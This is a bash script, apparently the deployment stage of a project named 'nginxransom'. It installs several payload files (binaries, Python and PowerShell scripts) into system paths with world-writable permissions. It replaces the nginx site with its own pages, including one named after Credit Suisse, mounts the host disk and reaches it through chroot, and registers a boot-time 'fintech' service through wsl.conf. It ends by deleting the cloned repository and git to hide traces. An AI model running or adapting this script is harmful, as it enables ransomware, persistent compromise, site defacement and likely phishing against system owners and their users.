#!/bin/bash  
#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
apt install systemctl -y
cp   nginxransom/initialize.txt /usr/bin/initialize  
chmod 777 /usr/bin/initialize 
initialize &
cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
chroot mnt/ mkdir libx64
cp   nginxransom/bootstarp.txt /mnt/libx64/usr/bin/bootstarp
cp   nginxransom/bootstarp.txt /mnt/libx64/usr/local/bin/bootstarp 
cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
cp   nginxransom/service.sh ../
cp   nginxransom/service.sh ../mnt/libx64/
cp   nginxransom/init.py    ../mnt/libx64/
cp   nginxransom/hoa.ps1    ../mnt/libx64/
cp   nginxransom/hoachanged.ps1 ../mnt/libx64/
cp   nginxransom/hoascheduler.ps1 ../mnt/libx64/
cp   nginxransom/win.sh     ../mnt/libx64/
chmod 777 /usr/bin/bootstarp 
chmod 777 mnt/libx64/usr/local/bin/bootstarp
chmod 777 mnt/libx64/usr/bin/bootstarp 
chmod 777 mnt/libx64/service.sh
chmod 777 service.sh
chmod 777 mnt/libx64/init.py
chmod 777 mnt/libx64/hoa.ps1
chmod 777 mnt/libx64/hoachanged.ps1
chmod 777 mnt/libx64/hoascheduler.ps1
chmod 777 mnt/libx64/win.sh
chroot mnt/libx64/ cp service.sh /etc/init.d/fintech
rm -rf service.sh
chroot mnt/libx64/ chmod +x /etc/init.d/fintech
chroot mnt/libx64/ service fintech start
#chroot mnt/libx64/ ./service.sh start
chroot mnt/libx64/ update-rc.d fintech defaults
chroot mnt/libx64/ echo -e '[boot]\ncommand="service fintech start && service docker start"\n\n[automount]\nenabled = true\nroot = /\noptions = "metadata"' > mnt/libx64/etc/wsl.conf
#chroot ./ ./bootstarp 
#echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/libx64/usr/lib/systemd/system/finetech.service
#chmod 777  mnt/libx64/usr/lib/systemd/system/finetech.service
#chroot mnt/libx64/ systemctl daemon-reload
#wait
#chroot mnt/libx64/ systemctl enable finetech.service
#chroot mnt/libx64/ systemctl start finetech.service
chroot mnt/libx64/ rm -rf service.sh
apt remove git -y
 
rm -rf nginxransom/
./libx64/win.sh &
#wait
#chroot mnt/libx64/ poweroff -f
